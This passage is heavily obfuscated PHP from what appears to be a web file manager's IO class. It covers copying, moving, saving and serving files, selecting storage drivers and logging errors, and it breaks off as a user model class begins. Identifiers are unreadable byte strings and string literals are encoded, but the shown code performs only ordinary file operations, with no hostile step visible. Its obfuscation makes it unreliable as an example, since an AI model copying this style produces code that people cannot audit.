(method_exists(self, $Óã¨èµŠ)) { $Øº„´Îµ = @call_user_func_array(array(self, $Óã¨èµŠ), $ œÍÒìÎ); } else { $Øº„´Îµ = call_user_func_array(array(parent, $Óã¨èµŠ), $ œÍÒìÎ); } } } Hook::trigger($¸²«„›ø[1332] . $Óã¨èµŠ . $¸²«„›ø[1336], $›î†Ù–, $Øº„´Îµ); return $Øº„´Îµ; } public static function init($¡úà§öÔ) { return self::driverMake($¡úà§öÔ); } public static function copy($‘²ÈÀä¥, $Ø£´µŞà, $¤Ç×ÄĞö = false, $şÚØá¨Ô = false) { return self::copyMoveStart($‘²ÈÀä¥, $Ø£´µŞà, $¤Ç×ÄĞö, $_SERVER[©—Ò»ÅĞ][641], $şÚØá¨Ô); } public static function move($İß¢¢Ÿ, $€ Ì‹ö®, $¤Ó÷êÁ¿ = false, $ŒË„›¾Õ = false) { return self::copyMoveStart($İß¢¢Ÿ, $€ Ì‹ö®, $¤Ó÷êÁ¿, $_SERVER[©—Ò»ÅĞ][643], $ŒË„›¾Õ); } public static function copyMoveChildren($“‰ŠĞ¤ª, $àúµÑâ, $éˆ¾â÷¬ = "\143\x6f\x70\171", $Úİ¡ÄÍ³ = REPEAT_REPLACE) { $»„º¨›ü =& $_SERVER[©—Ò»ÅĞ]; $§«ØÊ™Î = $“‰ŠĞ¤ª; $ÂÁ»ÇçÛ = self::driverMake($“‰ŠĞ¤ª); $¶£ÅÖ¸¦ = $ÂÁ»ÇçÛ->listPath($“‰ŠĞ¤ª, !0); $ÂíÔ‘™‰ = array_merge($¶£ÅÖ¸¦[$»„º¨›ü[86]], $¶£ÅÖ¸¦[$»„º¨›ü[85]]); foreach ($ÂíÔ‘™‰ as $€§Ÿ¦‚Ï) { self::copyMoveStart($€§Ÿ¦‚Ï[$»„º¨›ü[87]], $àúµÑâ, $Úİ¡ÄÍ³, $éˆ¾â÷¬, !1); } if ($éˆ¾â÷¬ == $»„º¨›ü[643]) { self::remove($§«ØÊ™Î); } } private static function copyMoveStart($Æü“Øè, $ ¦ÌÇµİ, $Óƒ‰ÁÅ¤, $˜ãúîå, $íâÄÚ°Ì) { $õæ Àšü =& $_SERVER[©—Ò»ÅĞ]; $„½ô­”Û = array($Æü“Øè, $ ¦ÌÇµİ, $Óƒ‰ÁÅ¤, $íâÄÚ°Ì); Hook::trigger($õæ Àšü[1332] . $˜ãúîå . $õæ Àšü[1333], $„½ô­”Û); $˜Ü¥ÊªÉ = self::copyMove($Æü“Øè, $ ¦ÌÇµİ, $Óƒ‰ÁÅ¤, $˜ãúîå, $íâÄÚ°Ì); Hook::trigger($õæ Àšü[1332] . $˜ãúîå . $õæ Àšü[1336], $„½ô­”Û, $˜Ü¥ÊªÉ); return $˜Ü¥ÊªÉ; } public static function saveFile($ÙÆŒßª, $Ü÷Ã¤Í•, $¬šğÜ™µ = true) { $‡ˆëÄû =& $_SERVER[©—Ò»ÅĞ]; $ÙˆÏ±è’ = self::info($Ü÷Ã¤Í•); $êø¨ı·Ş = self::driverMake($ÙÆŒßª); $ƒöë°€ş = self::driverMake($Ü÷Ã¤Í•); $ÅÇ¡ıÕ = !1; if ($ƒöë°€ş->pathParse[$‡ˆëÄû[1337]]) { $ÅÇ¡ıÕ = $ƒöë°€ş; $¹ïéÑ°š = $ƒöë°€ş->pathParse[$‡ˆëÄû[1337]]; $ƒöë°€ş = self::driverMake($¹ïéÑ°š); } if ($êø¨ı·Ş->pathParse[$‡ˆëÄû[1337]]) { $„Ù”Ë§ô = $êø¨ı·Ş->pathParse[$‡ˆëÄû[1337]]; $êø¨ı·Ş = self::driverMake($„Ù”Ë§ô); } $ú”õìÈ = $ƒöë°€ş->pathFather($Ü÷Ã¤Í•); $êµ»‡ˆ = !0; if (!$¬šğÜ™µ && self::driverIsSame($êø¨ı·Ş, $ƒöë°€ş)) { $êµ»‡ˆ = !1; } $…öŞşÑ† = self::copyFile($êø¨ı·Ş, $ÙÆŒßª, $ƒöë°€ş, $ú”õìÈ, $ÙˆÏ±è’[$‡ˆëÄû[32]], $êµ»‡ˆ); if ($ÅÇ¡ıÕ) { $…öŞşÑ† = $ÅÇ¡ıÕ->getPathOuter($…öŞşÑ†); } return $…öŞşÑ†; } private static function copyMove($ÆËŞó‡ò, $ë’õÌ¾Æ, $Ù‚Øş·œ, $ã©®†…×, $ÚÃ‘¡Ø… = false) { $ï¬«éµ£ =& $_SERVER[©—Ò»ÅĞ]; if (!$ÆËŞó‡ò || $ÆËŞó‡ò == $ï¬«éµ£[8] || !$ë’õÌ¾Æ) { return !1; } ignore_timeout(); $—ÀîÓÖ¤ = self::driverMake($ÆËŞó‡ò); $İ¥üÄ°î = self::driverMake($ë’õÌ¾Æ); $§çå“¹Ñ = $ã©®†…× == $ï¬«éµ£[643]; $ÓÑ£õü = !1; if ($İ¥üÄ°î->pathParse[$ï¬«éµ£[1337]]) { $ÓÑ£õü = $İ¥üÄ°î; $ë’õÌ¾Æ = $İ¥üÄ°î->pathParse[$ï¬«éµ£[1337]]; $İ¥üÄ°î = self::driverMake($ë’õÌ¾Æ); } if ($—ÀîÓÖ¤->pathParse[$ï¬«éµ£[1337]]) { $ÆËŞó‡ò = $—ÀîÓÖ¤->pathParse[$ï¬«éµ£[1337]]; $—ÀîÓÖ¤ = self::driverMake($ÆËŞó‡ò); } self::check($—ÀîÓÖ¤, $ÆËŞó‡ò, $İ¥üÄ°î, $ë’õÌ¾Æ); Hook::trigger($ï¬«éµ£[1338], $—ÀîÓÖ¤, $ÆËŞó‡ò, $İ¥üÄ°î, $ë’õÌ¾Æ); $Ó§„Íá™ = self::driverIsSame($—ÀîÓÖ¤, $İ¥üÄ°î); if ($Ó§„Íá™) { if ($ã©®†…× == $ï¬«éµ£[643] && !method_exists($İ¥üÄ°î, $ï¬«éµ£[1339]) && trim($ë’õÌ¾Æ, $ï¬«éµ£[8]) == trim($İ¥üÄ°î->pathFather($ÆËŞó‡ò), $ï¬«éµ£[8])) { if ($—ÀîÓÖ¤->pathThis($ÆËŞó‡ò) != $ÚÃ‘¡Ø… && !$—ÀîÓÖ¤->isOsDriver()) { return $—ÀîÓÖ¤->rename($ÆËŞó‡ò, $ÚÃ‘¡Ø…); } return $İ¥üÄ°î->getPathOuter($ÆËŞó‡ò); } if (method_exists($İ¥üÄ°î, $ã©®†…×)) { return $İ¥üÄ°î->{$ã©®†…×}($ÆËŞó‡ò, $ë’õÌ¾Æ, $Ù‚Øş·œ, $ÚÃ‘¡Ø…); } } if ($Ó§„Íá™ && $ã©®†…× == $ï¬«éµ£[643] && $İ¥üÄ°î->getType() == $ï¬«éµ£[106]) { $•¾óÑ…Ò = $İ¥üÄ°î->movePath($ÆËŞó‡ò, $ë’õÌ¾Æ, $ÚÃ‘¡Ø…); if ($•¾óÑ…Ò) { return $•¾óÑ…Ò; } } $¨ß®¦ñÕ = $—ÀîÓÖ¤->isFile($ÆËŞó‡ò); if (!$¨ß®¦ñÕ && $İ¥üÄ°î->getType() == $ï¬«éµ£[858] && $—ÀîÓÖ¤->getType() == $ï¬«éµ£[106]) { $•¾óÑ…Ò = $İ¥üÄ°î->copyFolderFromIO($—ÀîÓÖ¤, $ÆËŞó‡ò, $ë’õÌ¾Æ, $Ù‚Øş·œ, $§çå“¹Ñ, $ÚÃ‘¡Ø…); } else { $•¾óÑ…Ò = self::copyPath($—ÀîÓÖ¤, $ÆËŞó‡ò, $İ¥üÄ°î, $ë’õÌ¾Æ, $Ù‚Øş·œ, $§çå“¹Ñ, $¨ß®¦ñÕ, $ÚÃ‘¡Ø…); } if ($•¾óÑ…Ò && $§çå“¹Ñ) { $—ÀîÓÖ¤->remove($ÆËŞó‡ò); } if ($ÓÑ£õü) { $•¾óÑ…Ò = $ÓÑ£õü->getPathOuter($•¾óÑ…Ò); } return $•¾óÑ…Ò; } private static function check($üÍàš¥Ğ, $’ë­—Ï, $Ş±´ÉÖ½, &$Éã‰œÔ¦) { $ÙÎ°­Ú =& $_SERVER[©—Ò»ÅĞ]; if (self::driverIsSame($üÍàš¥Ğ, $Ş±´ÉÖ½) && $üÍàš¥Ğ->isFolder($’ë­—Ï) && $üÍàš¥Ğ->isParentOf($’ë­—Ï, $Éã‰œÔ¦)) { show_json(LNG($ÙÎ°­Ú[1340]), !1); } if (!$üÍàš¥Ğ->exist($’ë­—Ï)) { show_json(LNG($ÙÎ°­Ú[105]), !1); } } private static function copyPath($àÍñÃ¸¤, $Ò´ÛŸ¯, $“ÎÃ¨ÀÇ, $ã±€³ï, $¯ÒßŸÁ«, $Ø²«¼Ä”, $®İåß…“, $šïûã¾Ş = false, $Äù”Š‡ = true) { $ï§â²Ã¥ =& $_SERVER[©—Ò»ÅĞ]; $…ÆúöÌË = empty($šïûã¾Ş) && $šïûã¾Ş !== $ï§â²Ã¥[228] ? $àÍñÃ¸¤->pathThis($Ò´ÛŸ¯) : $šïûã¾Ş; if ($¯ÒßŸÁ«) { $éúÁ½íÄ = $“ÎÃ¨ÀÇ->fileNameExist($ã±€³ï, $…ÆúöÌË); $óÚî¶Ø = $…ÆúöÌË; $…ÆúöÌË = $“ÎÃ¨ÀÇ->fileNameAuto($ã±€³ï, $…ÆúöÌË, $¯ÒßŸÁ«, !$®İåß…“); if (!$éúÁ½íÄ || $óÚî¶Ø != $…ÆúöÌË) { $¯ÒßŸÁ« = !1; } if ($Äù”Š‡ && !$¯ÒßŸÁ«) { $“ÎÃ¨ÀÇ->_data[$ï§â²Ã¥[1341]] = !0; } } if ($®İåß…“) { return self::copyFile($àÍñÃ¸¤, $Ò´ÛŸ¯, $“ÎÃ¨ÀÇ, $ã±€³ï, $…ÆúöÌË, $Ø²«¼Ä”); } if ($¯ÒßŸÁ« == REPEAT_RENAME_FOLDER) { $¯ÒßŸÁ« = !1; } $µ¥±ş½ = rtrim($ã±€³ï, $ï§â²Ã¥[8]) . $ï§â²Ã¥[8] . $…ÆúöÌË; $™äÛé¼ = $“ÎÃ¨ÀÇ->mkdir($“ÎÃ¨ÀÇ->getPath($µ¥±ş½), $¯ÒßŸÁ«); $ã±€³ï = $“ÎÃ¨ÀÇ->getPathInner($™äÛé¼); $šŒ§å÷Ş = $àÍñÃ¸¤->listPath($Ò´ÛŸ¯, !0); $šŒ§å÷Ş = is_array($šŒ§å÷Ş) ? $šŒ§å÷Ş : array($ï§â²Ã¥[86] => array(), $ï§â²Ã¥[85] => array()); $şè²ƒ÷° = array_merge($šŒ§å÷Ş[$ï§â²Ã¥[86]], $šŒ§å÷Ş[$ï§â²Ã¥[85]]); foreach ($şè²ƒ÷° as $·ÔÔ”†ñ) { $â¯ı°¢Ø = $·ÔÔ”†ñ[$ï§â²Ã¥[33]] == $ï§â²Ã¥[230]; $Ò´ÛŸ¯ = $àÍñÃ¸¤->getPathInner($·ÔÔ”†ñ[$ï§â²Ã¥[87]]); $àøòßÅÚ = self::copyPath($àÍñÃ¸¤, $Ò´ÛŸ¯, $“ÎÃ¨ÀÇ, $ã±€³ï, $¯ÒßŸÁ«, $Ø²«¼Ä”, $â¯ı°¢Ø, !1, !1); if (!$àøòßÅÚ) { IO::errorTips($ï§â²Ã¥[1342] . $Ò´ÛŸ¯ . $ï§â²Ã¥[73] . $ã±€³ï); } } self::copyMoveKeepInfo($àÍñÃ¸¤, $Ò´ÛŸ¯, $™äÛé¼); return $™äÛé¼; } private static function copyFile($…à’Éà², $’ôã  ¿, $¸šÉ™õ·, $øãÆ×®, $–°Æô”ç, $¨ı‡¬”¾) { $£ÔÓµ‡Ã =& $_SERVER[©—Ò»ÅĞ]; $øãÆ×® = $¸šÉ™õ·->getPath(rtrim($øãÆ×®, $£ÔÓµ‡Ã[8]) . $£ÔÓµ‡Ã[8] . $–°Æô”ç); $¯ü¥­¥ï = $£ÔÓµ‡Ã[1343] . time() . rand_string(5); Hook::trigger($£ÔÓµ‡Ã[1344], $…à’Éà², $’ôã  ¿, $¸šÉ™õ·, $øãÆ×®, $–°Æô”ç, $¯ü¥­¥ï); if (self::driverIsSame($…à’Éà², $¸šÉ™õ·)) { if ($¨ı‡¬”¾) { $ßÁâïü = $¸šÉ™õ·->moveFile($’ôã  ¿, $øãÆ×®); } else { $ßÁâïü = $¸šÉ™õ·->copyFile($’ôã  ¿, $øãÆ×®); } Hook::trigger($£ÔÓµ‡Ã[1345], $…à’Éà², $’ôã  ¿, $¸šÉ™õ·, $øãÆ×®, $–°Æô”ç, $ßÁâïü); self::copyMoveKeepInfo($…à’Éà², $’ôã  ¿, $ßÁâïü); return $ßÁâïü; } $¢‚Ï™»¸ = TEMP_FILES; if ($GLOBALS[$£ÔÓµ‡Ã[6]][$£ÔÓµ‡Ã[92]][$£ÔÓµ‡Ã[898]]) { $¢‚Ï™»¸ = $GLOBALS[$£ÔÓµ‡Ã[6]][$£ÔÓµ‡Ã[92]][$£ÔÓµ‡Ã[898]]; } $ÃĞ¦‚õ = $¢‚Ï™»¸; mk_dir($ÃĞ¦‚õ); $òÆŞ†ö¿ = $ÃĞ¦‚õ . $¯ü¥­¥ï; $ŸäõÁ · = $òÆŞ†ö¿; $òÆŞ†ö¿ = $…à’Éà²->download($’ôã  ¿, $òÆŞ†ö¿); $òÆŞ†ö¿ = $…à’Éà²->iconvApp($òÆŞ†ö¿); if (substr($òÆŞ†ö¿, strlen($¢‚Ï™»¸)) == $¢‚Ï™»¸) { $¨ı‡¬”¾ = !0; } $ßÁâïü = $¸šÉ™õ·->upload($øãÆ×®, $òÆŞ†ö¿, $¨ı‡¬”¾); self::remove($ŸäõÁ ·); Hook::trigger($£ÔÓµ‡Ã[1345], $…à’Éà², $’ôã  ¿, $¸šÉ™õ·, $øãÆ×®, $–°Æô”ç, $ßÁâïü); self::copyMoveKeepInfo($…à’Éà², $’ôã  ¿, $ßÁâïü); return $ßÁâïü; } private static function copyMoveKeepInfo($ƒ…È«İò, $µî´ş´, $˜ùŠÀïÇ) { if (!$˜ùŠÀïÇ) { return; } $­Í‹Ô€ = $ƒ…È«İò->info($µî´ş´); if (!is_array($­Í‹Ô€)) { return; } IO::setModifyTime($˜ùŠÀïÇ, $­Í‹Ô€[$_SERVER[©—Ò»ÅĞ][88]]); } public static function pathFather($íÏ±©) { $Ü‡Ä²Ø² = IO::init($íÏ±©); $Ú¼®¯¯æ = $Ü‡Ä²Ø²->pathFather($Ü‡Ä²Ø²->path); return $Ü‡Ä²Ø²->getPathOuter($Ú¼®¯¯æ); } public static function fileOut($ÍØ‹°µö, $½´ñŸ•ç = false, $éßëÔİ¥ = false, $¤äûŒÖ = '') { $Ñ’šş¬ = self::driverMake($ÍØ‹°µö); if ($Ñ’šş¬->isFileOutServer()) { return $Ñ’šş¬->fileOutServer($ÍØ‹°µö, $½´ñŸ•ç, $éßëÔİ¥, $¤äûŒÖ); } return $Ñ’šş¬->fileOut($ÍØ‹°µö, $½´ñŸ•ç, $éßëÔİ¥, $¤äûŒÖ); } public static function fileOutImage($Ô¹‡‘, $Ê«õ¬ê× = 250) { $¼¨İ¤Ö— = array(250, 600, 1200, 2000, 3000, 5000); for ($á…¬ËÙ = 0; $á…¬ËÙ < count($¼¨İ¤Ö—); $á…¬ËÙ++) { if ($á…¬ËÙ == 0 && $Ê«õ¬ê× <= $¼¨İ¤Ö—[$á…¬ËÙ]) { $Ê«õ¬ê× = $¼¨İ¤Ö—[$á…¬ËÙ]; break; } else { if ($Ê«õ¬ê× > $¼¨İ¤Ö—[$á…¬ËÙ - 1] && $Ê«õ¬ê× <= $¼¨İ¤Ö—[$á…¬ËÙ]) { $Ê«õ¬ê× = $¼¨İ¤Ö—[$á…¬ËÙ]; break; } else { if ($á…¬ËÙ == count($¼¨İ¤Ö—) - 1 && $Ê«õ¬ê× > $¼¨İ¤Ö—[$á…¬ËÙ]) { $Ê«õ¬ê× = $¼¨İ¤Ö—[$á…¬ËÙ]; break; } } } } $¡°‡ŒŸ = self::driverMake($Ô¹‡‘); if ($¡°‡ŒŸ->isFileOutServer()) { return $¡°‡ŒŸ->fileOutImageServer($Ô¹‡‘, $Ê«õ¬ê×); } return $¡°‡ŒŸ->fileOutImage($Ô¹‡‘, $Ê«õ¬ê×); } private static function driverIsSame($ğ¤»Í²¾, $ûõ’ŞÏ) { $üÈı­Ä÷ =& $_SERVER[©—Ò»ÅĞ]; $ıîÊ–½Í = $ğ¤»Í²¾->getType(); $™Ç…ï = $ûõ’ŞÏ->getType(); if ($ıîÊ–½Í != $™Ç…ï) { return !1; } if ($ıîÊ–½Í == $üÈı­Ä÷[858]) { return !0; } if ($ıîÊ–½Í == $üÈı­Ä÷[106]) { return !0; } if ($ğ¤»Í²¾->pathDriver == $ûõ’ŞÏ->pathDriver) { return !0; } return !1; } public static function copyUpdate($Ú³¥ËöÒ, $ùÒ¡Æ»Á) { $€˜ØÎåÆ =& $_SERVER[©—Ò»ÅĞ]; if (!IO::exist($Ú³¥ËöÒ)) { return !1; } if (!IO::exist($ùÒ¡Æ»Á)) { IO::mkdir($ùÒ¡Æ»Á); } $ ÁüŠÈ = array_to_keyvalue(self::listAllSimple($Ú³¥ËöÒ), $€˜ØÎåÆ[87]); $ÈíÓ„Ïè = array_to_keyvalue(self::listAllSimple($ùÒ¡Æ»Á), $€˜ØÎåÆ[87]); $‡‘Ğšô = array(); $’é‹¬ÖÒ = array(); foreach ($ ÁüŠÈ as $èŒ™™·» => $…êşıéõ) { if (isset($ÈíÓ„Ïè[$èŒ™™·»])) { if ($…êşıéõ[$€˜ØÎåÆ[78]] == 1) { continue; } if ($ÈíÓ„Ïè[$èŒ™™·»][$€˜ØÎåÆ[79]] == $…êşıéõ[$€˜ØÎåÆ[79]]) { continue; } } if ($…êşıéõ[$€˜ØÎåÆ[78]] == 1) { $’é‹¬ÖÒ[] = $ùÒ¡Æ»Á . $€˜ØÎåÆ[8] . trim($èŒ™™·», $€˜ØÎåÆ[8]); continue; } $üˆÛ¥‰³ = strstr(trim($èŒ™™·», $€˜ØÎåÆ[8]), $€˜ØÎåÆ[8]) ? get_path_father($èŒ™™·») : $€˜ØÎåÆ[12]; $‡‘Ğšô[] = array($€˜ØÎåÆ[1346] => $…êşıéõ[$€˜ØÎåÆ[89]], $€˜ØÎåÆ[1347] => rtrim($ùÒ¡Æ»Á, $€˜ØÎåÆ[8]) . $€˜ØÎåÆ[8] . $üˆÛ¥‰³, $€˜ØÎåÆ[1348] => $…êşıéõ); } $Áı¾ª’ = array($€˜ØÎåÆ[230] => $‡‘Ğšô, $€˜ØÎåÆ[78] => $’é‹¬ÖÒ); Hook::trigger($€˜ØÎåÆ[1349], $Ú³¥ËöÒ, $ùÒ¡Æ»Á, $Áı¾ª’); foreach ($’é‹¬ÖÒ as $…êşıéõ) { IO::mkdir($…êşıéõ); } foreach ($‡‘Ğšô as $…êşıéõ) { IO::copy($…êşıéõ[$€˜ØÎåÆ[1346]], $…êşıéõ[$€˜ØÎåÆ[1347]], REPEAT_REPLACE); } } public static function fileSubstr($ŒŠêúÍµ, $¾ú°œû—, $ë÷óÈ‰¦ = false) { $‚”‡‡İ‘ =& $_SERVER[©—Ò»ÅĞ]; $ÓŸ‡¿£ = self::driverMake($ŒŠêúÍµ); $Áè¡ò©Ì = $ÓŸ‡¿£->size($ŒŠêúÍµ); $í´°›‹ë = $¾ú°œû—; $¡Ù½îõµ = $ë÷óÈ‰¦; if ($¾ú°œû— < 0) { $¾ú°œû— = $Áè¡ò©Ì + $¾ú°œû—; } if ($ë÷óÈ‰¦ === !1) { $ë÷óÈ‰¦ = $Áè¡ò©Ì - $¾ú°œû—; } if ($¾ú°œû— + $ë÷óÈ‰¦ > $Áè¡ò©Ì) { $ë÷óÈ‰¦ = $Áè¡ò©Ì - $¾ú°œû—; } if (!$Áè¡ò©Ì && $ÓŸ‡¿£->getType() == $‚”‡‡İ‘[106] && !$ÓŸ‡¿£->exist($ŒŠêúÍµ)) { $‹ĞÖ§’ñ = get_path_this($ŒŠêúÍµ); $±ÚÕ­óÁ = parse_url_query($‹ĞÖ§’ñ); if (is_array($±ÚÕ­óÁ) && isset($±ÚÕ­óÁ[$‚”‡‡İ‘[32]])) { $‹ĞÖ§’ñ = urldecode($±ÚÕ­óÁ[$‚”‡‡İ‘[32]]); } throw new Exception($‚”‡‡İ‘[1350] . LNG($‚”‡‡İ‘[1351]) . $‚”‡‡İ‘[1134] . clear_html($‹ĞÖ§’ñ) . $‚”‡‡İ‘[12]); } if ($ë÷óÈ‰¦ <= 0) { return $‚”‡‡İ‘[12]; } if ($¾ú°œû— < 0 || $¾ú°œû— >= $Áè¡ò©Ì || $ë÷óÈ‰¦ > $GLOBALS[$‚”‡‡İ‘[6]][$‚”‡‡İ‘[92]][$‚”‡‡İ‘[1352]]) { throw new Exception("\x66\x69\154\145\x52\x65\141\x64\40\x65\x72\x72\x6f\x72\54\x6f\166\x65\162\40\x69\x6f\122\145\141\144\x4d\141\170\41\40\x73\x74\141\x72\164\x3d{$¾ú°œû—}\x3b\154\x65\156\x67\164\150\75{$ë÷óÈ‰¦}\73\40\x73\x69\x7a\145\x3d{$Áè¡ò©Ì}\x3b"); } $¡İüğ·§ = $ÓŸ‡¿£->fileSubstr($ŒŠêúÍµ, $¾ú°œû—, $ë÷óÈ‰¦); if (!$¡İüğ·§ && $ë÷óÈ‰¦ && isset($GLOBALS[$‚”‡‡İ‘[1353]])) { throw new Exception($GLOBALS[$‚”‡‡İ‘[1353]][$‚”‡‡İ‘[1354]]); } return $¡İüğ·§; } private static function driverMake(&$õ°İ´°) { $À³ôÀÔú =& $_SERVER[©—Ò»ÅĞ]; $òçÅä„ë = KodIO::parse($õ°İ´°); if (!self::$driverListSystem) { $»ìÓÔ¥ = Model($À³ôÀÔú[868])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($»ìÓÔ¥, $À³ôÀÔú[487]); } if ($òçÅä„ë[$À³ôÀÔú[33]] == KodIO::KOD_IO && !self::$driverListSystem[$òçÅä„ë[$À³ôÀÔú[487]]]) { throw new Exception($À³ôÀÔú[1355]); return !1; } $õ°İ´° = $òçÅä„ë[$À³ôÀÔú[1356]]; $øß¨ÛªÂ = self::driverGet($òçÅä„ë, $õ°İ´°); return $øß¨ÛªÂ; } private static function driverGet($ì¥àÑöñ, &$öâŠ¹èÖ) { $©õğƒù¿ =& $_SERVER[©—Ò»ÅĞ]; $£ööÔÁÉ = $ì¥àÑöñ[$©õğƒù¿[1357]]; $†°¨ü‚Ô = $ì¥àÑöñ[$©õğƒù¿[487]]; switch ($ì¥àÑöñ[$©õğƒù¿[33]]) { case KodIO::KOD_IO: $È˜ùã½ = self::$driverListSystem[$†°¨ü‚Ô]; break; case KodIO::KOD_SOURCE: $öâŠ¹èÖ = $†°¨ü‚Ô . $öâŠ¹èÖ; $È˜ùã½ = array($©õğƒù¿[1358] => $©õğƒù¿[1359], $©õğƒù¿[6] => $ì¥àÑöñ); $È˜ùã½[$©õğƒù¿[6]][$©õğƒù¿[1360]] = $ì¥àÑöñ[$©õğƒù¿[487]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $½Ó©Í™» = $GLOBALS[$©õğƒù¿[1361]]; self::$driverListUser = array_to_keyvalue($½Ó©Í™», $©õğƒù¿[487]); } $È˜ùã½ = self::$driverListUser[$†°¨ü‚Ô]; break; case KodIO::KOD_SHARE_LINK: $È˜ùã½ = array($©õğƒù¿[1358] => $©õğƒù¿[1362], $©õğƒù¿[6] => $ì¥àÑöñ); $×©÷úã’ = Action($©õğƒù¿[1363])->sharePathInfo($ì¥àÑöñ[$©õğƒù¿[87]]); $öâŠ¹èÖ = $×©÷úã’[$©õğƒù¿[191]]; if (!$×©÷úã’[$©õğƒù¿[191]]) { $ÆºŞÙ‘ó = Model($©õğƒù¿[686])->getInfoByHash($ì¥àÑöñ[$©õğƒù¿[487]]); $öâŠ¹èÖ = KodIO::clear($ÆºŞÙ‘ó[$©õğƒù¿[583]] . $ì¥àÑöñ[$©õğƒù¿[1356]]); $ì¥àÑöñ[$©õğƒù¿[576]] = $ÆºŞÙ‘ó; $ì¥àÑöñ[$©õğƒù¿[1337]] = $öâŠ¹èÖ; $È˜ùã½ = array($©õğƒù¿[1358] => $©õğƒù¿[1364], $©õğƒù¿[6] => $ì¥àÑöñ); } else { $È˜ùã½[$©õğƒù¿[6]][$©õğƒù¿[1360]] = $×©÷úã’[$©õğƒù¿[191]]; } break; case KodIO::KOD_SHARE_ITEM: $È˜ùã½ = array($©õğƒù¿[1358] => $©õğƒù¿[1365], $©õğƒù¿[6] => $ì¥àÑöñ); $ÆºŞÙ‘ó = Model($©õğƒù¿[686])->getInfo($ì¥àÑöñ[$©õğƒù¿[487]]); if ($ÆºŞÙ‘ó[$©õğƒù¿[191]] == $©õğƒù¿[228]) { $öâŠ¹èÖ = KodIO::clear($ÆºŞÙ‘ó[$©õğƒù¿[583]] . $ì¥àÑöñ[$©õğƒù¿[1356]]); $ì¥àÑöñ[$©õğƒù¿[576]] = $ÆºŞÙ‘ó; $ì¥àÑöñ[$©õğƒù¿[1337]] = $öâŠ¹èÖ; $È˜ùã½ = array($©õğƒù¿[1358] => $©õğƒù¿[1366], $©õğƒù¿[6] => $ì¥àÑöñ); } else { if (!$öâŠ¹èÖ) { $öâŠ¹èÖ = $ÆºŞÙ‘ó[$©õğƒù¿[191]]; } $È˜ùã½[$©õğƒù¿[6]][$©õğƒù¿[1360]] = $ÆºŞÙ‘ó[$©õğƒù¿[191]]; } break; case KodIO::KOD_SHARE_OUTER: $È˜ùã½ = array($©õğƒù¿[1358] => $©õğƒù¿[1367], $©õğƒù¿[6] => $ì¥àÑöñ); break; default: $öâŠ¹èÖ = $ì¥àÑöñ[$©õğƒù¿[87]]; $È˜ùã½ = array($©õğƒù¿[1358] => $©õğƒù¿[1368]); break; } $Ğ¡äğÙ¹ = $ì¥àÑöñ[$©õğƒù¿[87]]; if (!isset(self::$driverCache[$Ğ¡äğÙ¹])) { $“¾Ü¡Õó = strtolower($È˜ùã½[$©õğƒù¿[96]]); $ÛÊÀŠ˜’ = $GLOBALS[$©õğƒù¿[6]][$©õğƒù¿[92]][$©õğƒù¿[934]]; $€¯¸‹ÚÖ = $©õğƒù¿[77] . (isset($ÛÊÀŠ˜’[$“¾Ü¡Õó]) ? $ÛÊÀŠ˜’[$“¾Ü¡Õó] : ucfirst($“¾Ü¡Õó)); if (!class_exists($€¯¸‹ÚÖ)) { show_json("{$€¯¸‹ÚÖ}\40\156\x6f\x74\x20\145\170\x69\163\164\x73\41", !1); } $ÓŞ¿ñˆÄ = isset($È˜ùã½[$©õğƒù¿[6]]) ? $È˜ùã½[$©õğƒù¿[6]] : !1; self::$driverCache[$Ğ¡äğÙ¹] = new $€¯¸‹ÚÖ($ÓŞ¿ñˆÄ); } $Ïç‰ø‘à = self::$driverCache[$Ğ¡äğÙ¹]; $Ïç‰ø‘à->pathDriver = $£ööÔÁÉ; $Ïç‰ø‘à->pathBase = $©õğƒù¿[12]; if (isset($È˜ùã½[$©õğƒù¿[6]][$©õğƒù¿[1369]])) { $Ïç‰ø‘à->pathBase = rtrim($È˜ùã½[$©õğƒù¿[6]][$©õğƒù¿[1369]], $©õğƒù¿[8]) . $©õğƒù¿[8]; $öâŠ¹èÖ = $Ïç‰ø‘à->pathBase . ltrim($öâŠ¹èÖ, $©õğƒù¿[8]); } $öâŠ¹èÖ = $Ïç‰ø‘à->getPath($öâŠ¹èÖ); if (isset($ì¥àÑöñ[$©õğƒù¿[1337]])) { $öâŠ¹èÖ = $ì¥àÑöñ[$©õğƒù¿[1337]]; } $Ïç‰ø‘à->path = $öâŠ¹èÖ; return $Ïç‰ø‘à; } public static function errorTips($×š‰¢°³ = false, $æßù©ÔØ = true) { $ó‹Çâ’ô =& $_SERVER[©—Ò»ÅĞ]; static $ªÇ«ãÚ° = array(); $ŸÇøñÚ¦ = 100; if ($×š‰¢°³ === -1) { return $ªÇ«ãÚ° ? $ªÇ«ãÚ°[count($ªÇ«ãÚ°) - 1] : $ó‹Çâ’ô[12]; } if ($×š‰¢°³ === !1) { return implode($ó‹Çâ’ô[285], $ªÇ«ãÚ°); } if (count($ªÇ«ãÚ°) >= $ŸÇøñÚ¦) { $ªÇ«ãÚ° = array_slice($ªÇ«ãÚ°, $ŸÇøñÚ¦ * 0.5, $ŸÇøñÚ¦); } $ªÇ«ãÚ°[] = $×š‰¢°³; if (!$æßù©ÔØ) { return; } write_log($ó‹Çâ’ô[173] . ACTION . $ó‹Çâ’ô[1370] . $×š‰¢°³, $ó‹Çâ’ô[1371]); } public static function getLastError($²é¢ˆçœ = '') { $ßÃÍïš’ = self::errorTips(-1); return $ßÃÍïš’ ? $ßÃÍïš’ : $²é¢ˆçœ; } } goto Fáœ†ËçÎ; Bì­ÃÌµè: class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\162"; protected $tableMeta = array("\x74\141\x62\154\x65\116\141\x6d\145" => "\x75\163\x65\162\137\155\145\x74\x61", "\x6d\x65\164\x61\x46\151\x65\x6c\144" => "\x75\x73\x65\x72\111\x44"); protected $simpleField = "\165\x73\x65\x72\x49\104\54\x6e\x69\143\153\116\x61\x6d\x65\54\x6e\x61\x6d\x65\x2c\141\x76\x61\x74\x61\162\54\x73\x65\170\54\x73\x74\141\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($²Ï±öÂı) { $Ø¤“Ãï‚ =& $_SERVER[©—Ò»ÅĞ]; 